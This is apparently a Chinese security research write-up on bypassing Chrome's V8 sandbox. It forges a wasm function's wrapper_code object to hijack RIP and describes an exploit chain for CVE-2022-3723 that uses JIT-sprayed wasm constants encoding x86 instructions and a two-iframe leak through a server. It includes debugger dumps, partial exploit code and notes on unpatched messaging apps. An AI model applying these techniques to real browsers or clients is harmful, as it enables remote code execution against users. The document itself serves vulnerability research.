![](https://image.3001.net/images/20230804/1691133186_64cca5025dcbc5f97804d.png!small)

### 0x00 - 引言

2023年7月21日，@5aelo发布了一篇新的关于v8沙箱的公开讨论文档：函数指针封装。鉴于该绕过未来将会被Chrome封装指针修复，本文公开讨论如何利用Function的native指针绕过Chrome最新版v8沙箱。

关于v8沙箱的来源及其进展，我们可以参考之前的一些文档。这里仅简单列表。V8 Sandbox - High-Level
Design主要讲解了顶层的设计思路。V8 Sandbox - External Pointer
Sandboxing主要讨论了外部指针表的设计，如何实现内存安全的方式访问V8沙箱之外的对象。高版本的Chrome漏洞利用，v8沙箱成为不得不考虑的缓解绕过。与以往类似，本文将深入讨论绕过思路和实现，并结合在野漏洞CVE-2022-3723(issue1378239)实现弹出计算器。
**目前该issue仍旧处于锁定状态** 。

### 0x01 - Function对象

在撰写exp的时候，一般是从对象破坏到任意读写，最后到代码执行。v8增加了沙箱后，基本思路应该是：

对象破坏->相对任意读写->绕过沙箱->代码执行

这里我们需要关注的就是从如何从相对任意读写到绕过沙箱。Javascript中的函数对象，正好具备这个特征。Function本身是一个对象，同时Function还可以实现执行代码。也就是说，它是对象到执行的一个桥梁。

如下是Function对象的数据结构：

    
    
    <!--测试源码-->   
    var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);   
    var wasmModule = new WebAssembly.Module(wasmCode);  
    var wasmInstance = new WebAssembly.Instance(wasmModule);  
    var f = wasmInstance.exports.main;  
    %DebugPrint(f);
    
    
    DebugPrint: 0x1f290011c161: [Function] in OldSpace
     - map: 0x1f29001138b9 <Map[28](HOLEY_ELEMENTS)> [FastProperties]
     - prototype: 0x1f2900104275 <JSFunction (sfi = 0x1f29000c8ef9)>
     - elements: 0x1f2900000219 <FixedArray[0]> [HOLEY_ELEMENTS]
     - function prototype: <no-prototype-slot>
     - shared_info: 0x1f290011c135 <SharedFunctionInfo js-to-wasm::i>
     - name: 0x1f2900002785 <String[1]: #0>
     - builtin: JSToWasmWrapper
     - formal_parameter_count: 0
     - kind: NormalFunction
     - context: 0x1f2900103c0d <NativeContext[281]>
     - code: 0x1f2900303979 <Code BUILTIN JSToWasmWrapper>
     - Wasm instance: 0x1f290011bf69 <Instance map = 0x1f290011a605>

hex数据如下

    
    
    0x1f290011c100        00000000 00040E40 00001E95 0011C0F1
    0x1f290011c110        00303979 00000000 0011BF69 00000000
    0x1f290011c120        000007D0 002B1A65 00000000 00000002
    0x1f290011c130        00040E60 00000D8D 0011C109 00002785
    0x1f290011c140        0000026D 0011BED1 00010000 00000000
    0x1f290011c150        00000000 FFFFFFFF 0000031B 00000000
    0x1f290011c160        001138B9 00000219 00000219 00057400
    0x1f290011c170        0011C135 00103C0D 000C22F9 00000061

### 0x02 - RIP 劫持

 **0x1f290011c160** 是对象起始地址， **0x1f290011C135** 是shared_info对象，我们查看该对象详情

    
    
    0x1f290011c135: [SharedFunctionInfo] in OldSpace
     - map: 0x1f2900000d8d <Map[44](SHARED_FUNCTION_INFO_TYPE)>
     - name: 0x1f2900002785 <String[1]: #0>
     - kind: NormalFunction
     - syntax kind: AnonymousExpression
     - function_map_index: 204
     - formal_parameter_count: 0
     - expected_nof_properties: 0
     - language_mode: sloppy
     - function_data: 0x1f290011c109 <Other heap object (WASM_EXPORTED_FUNCTION_DATA_TYPE)>
     - code (from function_data): 0x1f2900303979 <Code BUILTIN JSToWasmWrapper>
    …
    …

从SharedFunctionInfo可以看到对象function_data，地址是0x1f290011c109，然后解析该对象如下：

    
    
    0x1f290011c109: [WasmExportedFunctionData] in OldSpace
     - map: 0x1f2900001e95 <Map[44](WASM_EXPORTED_FUNCTION_DATA_TYPE)>
     - internal: 0x1f290011c0f1 <Other heap object (WASM_INTERNAL_FUNCTION_TYPE)>
     - wrapper_code: 0x1f2900303979 <Code BUILTIN JSToWasmWrapper>
     - js_promise_flags: 0

虽然在解析的时候能很快看到0x1f2900303979，但在内存中可以看到，是倒序出现的。这个问题应该可以通过对布局的小技巧实现固定排序。这里需要讨论的便是wrapper_code。

在最新版的v8中我们可以看到它是只读属性

    
    
    (gdb) vmmap 0x1f2900303979
    [ Legend:  Code | Heap | Stack ]
    Start              End                Offset             Perm Path
    0x00001f2900300000 0x00001f2900318000 0x0000000000000000 r-- 

不过没关系，我们可以伪造这个对象。如下是我们在最新版Chrome115.0.5790.170中的测试：

![](https://image.3001.net/images/20230804/1691133904_64cca7d028caf4eca69ab.png!small)对象地址是0x109900233314，我们修改地址为0x10990023332C处的数据为0x002333B5，然后在0x1099002333B4处伪造对象，劫持wasm目标地址为0x037557588B010。真实的wasm起始起始地址为0x37557588B000。如上图所示，我们可以成功劫持RIP为0x037557588B010，该处汇编为0xCC，gdb成功断下。

### 0x03 - issue1378239 绕过思路

issue1378239-CVE-2022-3723影响Chrome107.0.5304.62及其之前的版本，为2022年捕获的在野漏洞，但至今该Issue仍未公开。在谷歌公开poc的基础上，我们很容易实现任意相对读写。顾虑到本文讨论的重点是绕过沙箱，这里不再赘述如何从poc到任意读写。

实现任意读写后，我们可以泄漏wasm，客户端将泄漏的wasm地址发送到远端server，同时请求wasm。远端server接收到wasm地址后，立刻将wasm地址信息编译到wasm字节码并返回。由于我们可以劫持RIP，这里精巧设计wasm代码，使漏洞劫持RIP到wasm中的错位字节码。具体细节如下所示：

    
    
    var wasm_code = `
    (module
      (func $f (export "f") (param i64)
      (call $f (i64.const 0x12EB9060B0C03148)) ;; 48 31 C0 B0 60 90 EB 12
      (call $f (i64.const 0x0BEB9090008B4865)) ;; 65 48 8B 00 90 90 EB 0B
    ……
    ……

上述wasm代码编译后，在最新版Chrome内存中为RWX属性，不过在107.0.5304.63版本中为RX属性，我们可以控制的内容为$f函数的参数，这便足够我们执行任意代码。借助前两个字节48
31，可以让我们调转到下一个可控字节码。如此，在这段wasm中，我们可以一遍执行等效汇编，一边跳转。逐步完成VirtualProtect调用和跳转到Shellcode。具体设计细节可参考github中的公开代码。

### 0x04 - issue1378239 需要注意的部分

在撰写该exp时，发现在单独的Context环境中只能触发一次漏洞。于是该exp分成两步，先从一个iframe中触发信息泄漏，然后将该信息传递给Server，接着Server将泄漏的信息写入另一个html，客户端请求第二个html到本地的iframe中。由于两个iframe使用了相同的域名和端口，属于同一进程，其中泄漏的地址可以互相交叉使用。我们在第二个iframe中实现数组长度的修改，之后按照常规的任意读写，绕过v8沙箱实现沙箱内RCE。具体exp细节参考github。

### 0x05 - PatchGap

事实上，Chrome近期安全的确在不停的改进。2023年pwn2own中也没有出现Chrome Full
Chain。我们从在野的poc等也可观测到，其漏洞利用手法也越来越新颖，传统容易利用的类型混淆也逐渐被我们描述为品相极佳的漏洞。近年来TheHole和UninitiallizeOddBall等内置对象也在跟着不停改进。然而对抗一直是动态的，从表象上看也一直是平衡的。我们仍旧没有完全杜绝PatchGap在实际产品中的影响。

在研究1day和nday的过程中，实际上Teams/Skype等很多流行IM，仍旧无法跟上Chrome的修复进度。而无独有偶的是，Skype和Teams等IM的确加入了v8沙箱来缓解1/nday的威胁。

借助Chrome的patch
diff或者谷歌给出的poc，很大程度上降低了黑客复现漏洞和撰写exp的难度，这对共享相同组件的软件的确构成了很大威胁。如下是我们在研究在野/1day/nday过程中撰写的Skype的exp。其他受影响软件的patch
Gap这里不再赘述。

### 0x06 - 参考文献

https://github.com/numencyber/Vulnerability_PoC/tree/main/CVE-2022-3723

https://medium.com/@numencyberlabs/using-leaking-sentinel-value-to-bypass-the-latest-chrome-v8-hardenprotect-c4ed40e3d34f

https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-rce-183dcb6f3078

https://twitter.com/5aelo/status/1682405383896219649

https://docs.google.com/document/d/1CPs5PutbnmI-c5g7e_Td9CNGh5BvpLleKCqUnqmD82k/edit

https://docs.google.com/document/d/1V3sxltuFjjhp_6grGHgfqZNK57qfzGzme0QTk0IXDHk/edit

https://docs.google.com/presentation/d/1iDWDHuAZ8ee-dRF5Lkf0nwO2mkLdZG_YJEP1yPvJ09E/edit#slide=id.g19fd0c0660d_0_267﻿

